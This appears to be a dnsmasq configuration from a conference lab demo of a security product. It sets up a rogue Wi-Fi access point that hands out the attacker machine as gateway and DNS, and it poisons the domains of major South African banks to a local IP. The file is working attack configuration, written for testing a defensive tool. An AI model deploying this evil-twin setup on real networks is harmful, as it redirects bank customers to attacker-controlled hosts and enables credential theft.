# ============================================================
# WiFiGuard Evil Twin Lab — dnsmasq DNS poisoning config
# Team Themis | ITWeb Security Summit 2026
#
# PURPOSE: Poisons DNS responses for major SA banking domains,
# redirecting them to the attacker-controlled IP (192.168.1.1).
# WiFiGuard's Layer 1 DNS check compares resolved IPs against
# its baked-in signed list — any mismatch = immediate BLOCKED.
#
# VERIFY POISON IS WORKING (from a device on the rogue AP):
#   nslookup fnb.co.za
#   → Should return 192.168.1.1, NOT FNB's real IP
#
# USAGE:  Started/stopped exclusively via toggle.py
# ============================================================

# --- Interface binding ---
# Only serve DNS on the rogue AP interface — never on the
# interface used for legitimate upstream connectivity.
interface=wlan1
bind-interfaces

# --- Upstream DNS (for non-poisoned domains) ---
# Routes non-banking queries upstream so the fake network
# feels "working" to a casual user — increases attack realism.
server=8.8.8.8
server=8.8.4.4

# --- DHCP for rogue clients ---
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1      # Default gateway = attacker machine
dhcp-option=6,192.168.1.1      # DNS server   = attacker machine

# --- DNS poisoning: SA Banking domains → attacker IP ---
# FNB
address=/fnb.co.za/192.168.1.1
address=/online.fnb.co.za/192.168.1.1
address=/connect.fnb.co.za/192.168.1.1

# Capitec
address=/capitecbank.co.za/192.168.1.1
address=/www.capitecbank.co.za/192.168.1.1

# Standard Bank
address=/standardbank.co.za/192.168.1.1
address=/secure.standardbank.co.za/192.168.1.1
address=/sbg.standardbank.co.za/192.168.1.1

# Nedbank
address=/nedbank.co.za/192.168.1.1
address=/ib.nedbank.co.za/192.168.1.1

# Absa
address=/absa.co.za/192.168.1.1
address=/ib.absa.co.za/192.168.1.1

# TymeBank
address=/tymebank.co.za/192.168.1.1

# African Bank
address=/africanbank.co.za/192.168.1.1

# Discovery Bank
address=/discoverybank.co.za/192.168.1.1

# --- Logging ---
log-queries
log-facility=/var/log/dnsmasq_evil.log
